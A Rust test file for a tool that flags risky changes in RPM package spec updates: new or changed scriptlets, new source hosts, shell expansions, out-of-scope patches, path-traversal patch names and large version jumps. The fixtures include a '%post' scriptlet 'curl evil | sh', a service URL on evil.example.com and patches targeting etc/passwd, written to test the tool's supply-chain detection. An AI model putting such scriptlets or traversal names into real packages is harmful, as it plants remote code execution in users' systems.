use super::*;

const SPEC: &str = "Name: python-foo\nVersion: 1.0\nSource0: https://files.example.org/foo-1.0.tar.gz\n\
        Patch0: fix-build.patch\n%description\nFoo.\n%prep\n%setup -q\n%build\n%py3_build\n\
        %install\n%py3_install\n%files\n%{python3_sitelib}/foo\n";

const PATCH: &str = "--- foo-1.0/setup.py\t2020-01-01\n+++ foo-1.0/setup.py\t2020-01-01\n\
        @@ -1 +1 @@\n-a\n+b\n";

fn files(spec: &str) -> Files {
    Files {
        spec: Some(spec.to_string()),
        service: None,
        patches: BTreeMap::new(),
    }
}

fn with(replace: &str, with: &str) -> String {
    SPEC.replace(replace, with)
}

fn flags(base: &str, fin: &str) -> Vec<RiskFlag> {
    from_change(&files(base), &files(fin), &[])
}

#[test]
fn an_unchanged_package_has_no_risk() {
    assert!(flags(SPEC, SPEC).is_empty());
}

#[test]
fn a_new_scriptlet_is_flagged_by_its_header() {
    let fin = with("%install\n", "%post -n python3-foo\n%install\n");
    assert_eq!(
        flags(SPEC, &fin),
        vec![RiskFlag::NewScriptlet {
            header: "%post -n python3-foo".into()
        }]
    );
}

#[test]
fn a_changed_body_under_an_existing_scriptlet_is_not_a_new_one() {
    let base = with("%install\n", "%post\necho a\n%install\n");
    let fin = with("%install\n", "%post\necho b\n%install\n");
    assert!(
        flags(&base, &fin)
            .iter()
            .all(|f| !matches!(f, RiskFlag::NewScriptlet { .. }))
    );
}

#[test]
fn a_renamed_subpackage_keeps_its_scriptlet_and_is_not_a_new_one() {
    let base = with(
        "%install\n",
        "%post -n libfoo1_5_6 -p /sbin/ldconfig\n%install\n",
    );
    let fin = with(
        "%install\n",
        "%post -n libfoo2 -p /sbin/ldconfig\n%install\n",
    );
    assert!(flags(&base, &fin).is_empty());
}

#[test]
fn a_renamed_subpackage_with_a_new_body_is_flagged() {
    let base = with(
        "%install\n",
        "%post -n libfoo1 -p /sbin/ldconfig\n%install\n",
    );
    let fin = with("%install\n", "%post -n libfoo2\necho hi\n%install\n");
    assert_eq!(
        flags(&base, &fin),
        vec![RiskFlag::NewScriptlet {
            header: "%post -n libfoo2".into()
        }]
    );
}

#[test]
fn a_copy_of_a_scriptlet_for_a_new_subpackage_is_flagged() {
    let base = with(
        "%install\n",
        "%post -n libfoo1 -p /sbin/ldconfig\n%install\n",
    );
    let fin = with(
        "%install\n",
        "%post -n libfoo1 -p /sbin/ldconfig\n%post -n libfoo2 -p /sbin/ldconfig\n%install\n",
    );
    assert_eq!(
        flags(&base, &fin),
        vec![RiskFlag::NewScriptlet {
            header: "%post -n libfoo2 -p /sbin/ldconfig".into()
        }]
    );
}

#[test]
fn a_scriptlet_named_in_a_comment_is_not_one() {
    let fin = with("%install\n", "# %post is not used here\n%install\n");
    assert!(flags(SPEC, &fin).is_empty());
}

#[test]
fn a_new_source_host_is_flagged_and_a_known_one_is_not() {
    let same = with(
        "Source0: https://files.example.org/foo-1.0.tar.gz",
        "Source0: https://files.example.org/foo-%{version}.tar.gz",
    );
    assert!(flags(SPEC, &same).is_empty());
    let moved = with(
        "https://files.example.org/foo-1.0.tar.gz",
        "https://GitHub.com:443/foo/foo/archive/v1.0.tar.gz",
    );
    assert_eq!(
        flags(SPEC, &moved),
        vec![RiskFlag::NewSourceHost {
            host: "github.com".into()
        }]
    );
}

#[test]
fn a_patch_url_host_counts_and_a_userinfo_is_stripped() {
    let fin = with(
        "Patch0: fix-build.patch",
        "Patch0: https://user:pw@patches.example.net/fix.patch",
    );
    assert_eq!(
        flags(SPEC, &fin),
        vec![RiskFlag::NewSourceHost {
            host: "patches.example.net".into()
        }]
    );
}

#[test]
fn a_service_url_on_a_new_host_is_flagged() {
    let base = Files {
            spec: Some(SPEC.into()),
            service: Some(
                "<service name=\"download_url\"><param name=\"host\">files.example.org</param></service>"
                    .into(),
            ),
            patches: BTreeMap::new(),
        };
    let fin = Files {
            spec: Some(SPEC.into()),
            service: Some(
                "<service name=\"download_url\"><param name=\"url\">https://evil.example.com/x</param></service>"
                    .into(),
            ),
            patches: BTreeMap::new(),
        };
    assert_eq!(
        from_change(&base, &fin, &[]),
        vec![RiskFlag::NewSourceHost {
            host: "evil.example.com".into()
        }]
    );
}

#[test]
fn shell_and_lua_expansion_added_are_flagged() {
    let fin = with(
        "%py3_build\n",
        "%py3_build\n%global rev %(git rev-parse HEAD)\n%{lua: print(1)}\n",
    );
    let found = flags(SPEC, &fin);
    assert_eq!(
        found,
        vec![
            RiskFlag::ShellExpansion {
                line: "%global rev %(git rev-parse HEAD)".into()
            },
            RiskFlag::ShellExpansion {
                line: "%{lua: print(1)}".into()
            },
        ]
    );
}

#[test]
fn an_expansion_already_in_the_baseline_is_not_added() {
    let base = with("%py3_build\n", "%py3_build\n%global rev %(date)\n");
    assert!(flags(&base, &base).is_empty());
}

#[test]
fn a_script_requires_or_a_provides_changed_is_flagged_both_ways() {
    let base = with(
        "%description\n",
        "Requires(post): old-helper\nProvides: foo = 1.0\n%description\n",
    );
    let fin = with(
        "%description\n",
        "Requires(post,postun): new-helper\nProvides: foo = 2.0\n%description\n",
    );
    let found = flags(&base, &fin);
    assert!(found.contains(&RiskFlag::ScriptDependency {
        added: true,
        line: "Requires(post,postun): new-helper".into()
    }));
    assert!(found.contains(&RiskFlag::ScriptDependency {
        added: false,
        line: "Requires(post): old-helper".into()
    }));
    assert!(found.contains(&RiskFlag::ScriptDependency {
        added: true,
        line: "Provides: foo = 2.0".into()
    }));
    assert!(found.contains(&RiskFlag::ScriptDependency {
        added: false,
        line: "Provides: foo = 1.0".into()
    }));
    assert_eq!(found.len(), 4);
}

#[test]
fn a_plain_requires_is_not_a_script_dependency() {
    let fin = with(
        "%description\n",
        "Requires: bar\nRequires(pre): baz\n%description\n",
    );
    let found = flags(SPEC, &fin);
    assert_eq!(
        found,
        vec![RiskFlag::ScriptDependency {
            added: true,
            line: "Requires(pre): baz".into()
        }]
    );
}

#[test]
fn a_patch_added_outside_the_known_files_is_flagged() {
    let fin_patch = "--- foo-1.0/etc/passwd\n+++ foo-1.0/etc/passwd\n@@ -1 +1 @@\n-a\n+b\n";
    let mut fin = files(SPEC);
    fin.patches
        .insert("fix-build.patch".into(), fin_patch.into());
    let found = from_change(&files(SPEC), &fin, &["setup.py".into()]);
    assert_eq!(
        found,
        vec![RiskFlag::PatchOutsideSet {
            patch: "fix-build.patch".into(),
            path: "foo-1.0/etc/passwd".into()
        }]
    );
}

#[test]
fn a_patch_touching_a_file_of_the_archive_or_of_a_baseline_patch_is_not_flagged() {
    let mut base = files(SPEC);
    base.patches.insert("fix-build.patch".into(), PATCH.into());
    let mut fin = files(SPEC);
    let refreshed = "--- foo-1.0/setup.py\n+++ foo-1.0/setup.py\n@@ -1 +1 @@\n-a\n+c\n\
             --- foo-1.0/src/lib.c\n+++ b/src/lib.c\n@@ -1 +1 @@\n-a\n+c\n";
    fin.patches
        .insert("fix-build.patch".into(), refreshed.into());
    // setup.py is a baseline patch's file, src/lib.c is in the archive.
    assert!(from_change(&base, &fin, &["src/lib.c".into()]).is_empty());
}

#[test]
fn an_unchanged_patch_with_an_unknown_file_is_not_flagged() {
    let odd = "--- a/x\n+++ b/x/unknown\n@@ -1 +1 @@\n-a\n+b\n";
    let mut base = files(SPEC);
    base.patches.insert("odd.patch".into(), odd.into());
    let mut fin = files(SPEC);
    fin.patches.insert("odd.patch".into(), odd.into());
    assert!(from_change(&base, &fin, &[]).is_empty());
}

#[test]
fn a_plus_line_that_looks_like_a_header_is_not_a_file() {
    // A hunk adding "++ b/other" reads as "+++ b/other" but follows no "---".
    let text = "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-a\n++ b/other\n";
    assert_eq!(patch_paths(text), BTreeSet::from(["x".to_string()]));
}

#[test]
fn archive_members_lose_their_top_directory() {
    let tmp = tempfile::tempdir().unwrap();
    let path = tmp.path().join("foo-1.0.tar.gz");
    let file = std::fs::File::create(&path).unwrap();
    let enc = flate2::write::GzEncoder::new(file, flate2::Compression::fast());
    let mut tar = tar::Builder::new(enc);
    for name in ["foo-1.0/setup.py", "foo-1.0/src/lib.c"] {
        let mut h = tar::Header::new_gnu();
        h.set_size(1);
        h.set_mode(0o644);
        h.set_cksum();
        tar.append_data(&mut h, name, &b"x"[..]).unwrap();
    }
    tar.into_inner().unwrap().finish().unwrap();
    let files = archive_files(Some(&path));
    assert!(files.contains(&"setup.py".to_string()));
    assert!(files.contains(&"src/lib.c".to_string()));
    assert!(archive_files(None).is_empty());
}

#[test]
fn patch_names_come_from_the_spec_in_order() {
    let spec = "Patch: a.patch\nPatch12: b.patch\nSource: x.tar.gz\n";
    assert_eq!(patch_names(spec), vec!["a.patch", "b.patch"]);
}

#[test]
fn a_line_is_one_line_and_capped() {
    let line = RiskFlag::ShellExpansion {
        line: "%(x) ".repeat(200),
    }
    .line();
    assert!(!line.contains('\n'));
    assert!(line.starts_with("RISK: "));
    assert!(line.ends_with("..."));
}

#[test]
fn risks_accumulate_until_the_package_is_submitted() {
    let mut st = PkgState::default();
    settle(
        &mut st,
        "r1",
        vec![RiskFlag::NewScriptlet {
            header: "%post".into(),
        }],
    );
    // A run without a commit (AlreadyBuilt, missing_deps) leaves them, and
    // so does a later commit that finds nothing new.
    settle(&mut st, "r2", vec![]);
    assert_eq!(st.risk_flags.len(), 1);
    settle(&mut st, "r3", vec![]);
    assert_eq!(st.risk_flags.len(), 1);
}

#[test]
fn a_macro_named_patch_is_read_under_its_expanded_name() {
    let spec = "Name: python-foo\nVersion: 1.0\nPatch0: %{name}-fix.patch\n%prep\n";
    assert_eq!(patch_names(spec), vec!["python-foo-fix.patch".to_string()]);
    assert!(unanalysed_patches(spec).is_empty());
    let spec = "Name: python-foo\nVersion: 1.0\nPatch0: %{vendor}-fix.patch\n";
    assert!(patch_names(spec).is_empty());
    assert_eq!(
        unanalysed_patches(spec),
        vec!["%{vendor}-fix.patch".to_string()]
    );
    let fin = Files {
        spec: Some(spec.to_string()),
        ..Files::default()
    };
    assert!(
        from_change(&Files::default(), &fin, &[])
            .iter()
            .any(|f| matches!(f, RiskFlag::Unanalysed { .. }))
    );
}

#[test]
fn an_unread_patch_name_the_baseline_has_is_not_flagged_again() {
    let spec = "Name: python-foo\nVersion: 1.0\nPatch0: %{vendor}-fix.patch\n";
    let unread = |flags: &[RiskFlag]| {
        flags
            .iter()
            .any(|f| matches!(f, RiskFlag::Unanalysed { .. }))
    };
    let base = Files {
        spec: Some(spec.to_string()),
        ..Files::default()
    };
    let same = Files {
        spec: Some(spec.to_string() + "Source1: other.tar.gz\n"),
        ..Files::default()
    };
    assert!(!unread(&from_change(&base, &same, &[])));
    // A new unread patch is flagged, even when the old one stays.
    let added = Files {
        spec: Some(spec.to_string() + "Patch1: %{vendor}-more.patch\n"),
        ..Files::default()
    };
    assert!(unread(&from_change(&base, &added, &[])));
}

#[test]
fn a_patch_name_that_leaves_the_checkout_is_not_read_and_is_flagged() {
    for name in ["/etc/passwd", "../../outside.patch", "sub/../../x.patch"] {
        let spec = format!("Name: python-foo\nVersion: 1.0\nPatch0: {name}\n");
        assert!(patch_names(&spec).is_empty(), "{name}");
        let fin = Files {
            spec: Some(spec.clone()),
            ..Files::default()
        };
        assert!(
            from_change(&Files::default(), &fin, &[]).contains(&RiskFlag::Unanalysed {
                what: format!("patch {name} is not a plain file name of the checkout")
            }),
            "{name}"
        );
    }
}

#[test]
fn a_git_patch_with_only_its_headers_names_its_files() {
    let mut fin = files(SPEC);
    fin.patches.insert(
        "fix-build.patch".into(),
        "diff --git a/evil.py b/evil.py\nnew file mode 100644\n".into(),
    );
    assert_eq!(
        from_change(&files(SPEC), &fin, &[]),
        vec![RiskFlag::PatchOutsideSet {
            patch: "fix-build.patch".into(),
            path: "evil.py".into(),
        }]
    );
}

#[test]
fn a_new_service_in_the_service_file_is_flagged_by_its_name() {
    let base = Files {
        spec: Some(SPEC.to_string()),
        service: Some("<services>\n<service name=\"tar_scm\"/>\n</services>".into()),
        patches: BTreeMap::new(),
    };
    let mut fin = base.clone();
    fin.service = Some(format!(
        "{}\n<service name='download_url' mode=\"manual\"/>",
        fin.service.clone().unwrap()
    ));
    assert_eq!(
        from_change(&base, &fin, &[]),
        vec![RiskFlag::NewService {
            name: "download_url".into()
        }]
    );
}

#[test]
fn a_changed_scriptlet_body_under_an_existing_header_is_flagged() {
    let base = with("%install\n", "%post\necho a\n%install\n");
    let fin = with("%install\n", "%post\ncurl evil | sh\n%install\n");
    assert_eq!(
        flags(&base, &fin),
        vec![RiskFlag::ChangedScriptlet {
            header: "%post".into()
        }]
    );
}

#[test]
fn a_reader_outside_the_run_sees_the_risks_of_the_last_run() {
    let root = tempfile::tempdir().unwrap();
    assert!(of_package(root.path(), "python-foo").is_empty());
    let ws = Workspace::open(root.path(), "python-foo").unwrap();
    let risk = RiskFlag::NewSourceHost {
        host: "evil.example.com".into(),
    };
    PkgState::update(&ws, |st| settle(st, "r1", vec![risk.clone()])).unwrap();
    assert_eq!(of_package(root.path(), "python-foo"), vec![risk]);
    assert_eq!(
        lines_of_package(root.path(), "python-foo"),
        vec!["RISK: new source host: evil.example.com".to_string()]
    );
    // A later run that found nothing keeps it until the package is submitted.
    PkgState::update(&ws, |st| settle(st, "r2", vec![])).unwrap();
    assert_eq!(of_package(root.path(), "python-foo").len(), 1);
    clear_submitted(root.path(), "python-foo").unwrap();
    assert!(of_package(root.path(), "python-foo").is_empty());
}

#[test]
fn a_patch_changing_more_than_the_review_size_is_flagged_for_review() {
    let body = |n: usize| {
        let mut text = "--- foo-1.0/setup.py\n+++ foo-1.0/setup.py\n@@ -1 +1 @@\n".to_string();
        for i in 0..n {
            text.push_str(&format!("+line {i}\n"));
        }
        text
    };
    let mut at_size = files(SPEC);
    at_size
        .patches
        .insert("fix-build.patch".into(), body(REVIEW_PATCH_LINES));
    let found = from_change(&files(SPEC), &at_size, &["setup.py".into()]);
    assert!(
        !found
            .iter()
            .any(|r| matches!(r, RiskFlag::LargePatch { .. })),
        "{found:?}"
    );

    let mut over = files(SPEC);
    over.patches
        .insert("fix-build.patch".into(), body(REVIEW_PATCH_LINES + 1));
    let found = from_change(&files(SPEC), &over, &["setup.py".into()]);
    assert_eq!(
        found,
        vec![RiskFlag::LargePatch {
            patch: "fix-build.patch".into(),
            lines: REVIEW_PATCH_LINES + 1,
        }]
    );
    assert!(
        RiskFlag::LargePatch {
            patch: "fix-build.patch".into(),
            lines: 201,
        }
        .line()
        .starts_with("RISK: fix-build.patch changes 201 lines")
    );
}

#[test]
fn an_update_with_no_upstream_notes_is_a_risk_until_notes_are_found() {
    let mut st = PkgState::default();
    settle_no_upstream_notes(&mut st, "r1", "5.4", true);
    settle_no_upstream_notes(&mut st, "r2", "5.4", true);
    assert_eq!(
        st.risk_flags,
        vec![RiskFlag::NoUpstreamNotes {
            version: "5.4".into()
        }]
    );
    let line = st.risk_flags[0].line();
    assert_eq!(
        line,
        "RISK: no upstream changes listed for 5.4; read the sources for what changed"
    );
    // A later commit that finds nothing new keeps it; one that finds notes clears it.
    settle(&mut st, "r3", vec![]);
    assert_eq!(st.risk_flags.len(), 1);
    settle_no_upstream_notes(&mut st, "r4", "5.4", false);
    assert!(st.risk_flags.is_empty());
    assert_eq!(st.risk_flags_run_id.as_deref(), Some("r4"));
}

fn versioned(version: &str) -> String {
    SPEC.replace("Version: 1.0", &format!("Version: {version}"))
}

#[test]
fn a_jump_of_three_minor_series_is_flagged_by_its_series() {
    let found = flags(&versioned("3.4.13"), &versioned("3.9.7"));
    assert!(found.contains(&RiskFlag::LargeJump {
        from: "3.4".into(),
        to: "3.9".into()
    }));
    assert_eq!(
        found[0].line(),
        "RISK: large jump 3.4 -> 3.9, needs a review"
    );
}

#[test]
fn a_jump_of_two_minor_series_or_a_new_major_is_not_flagged() {
    assert!(flags(&versioned("3.4.13"), &versioned("3.6.0")).is_empty());
    assert!(flags(&versioned("3.4.13"), &versioned("4.0.0")).is_empty());
    assert!(flags(&versioned("3.4.13"), &versioned("3.4.14")).is_empty());
}
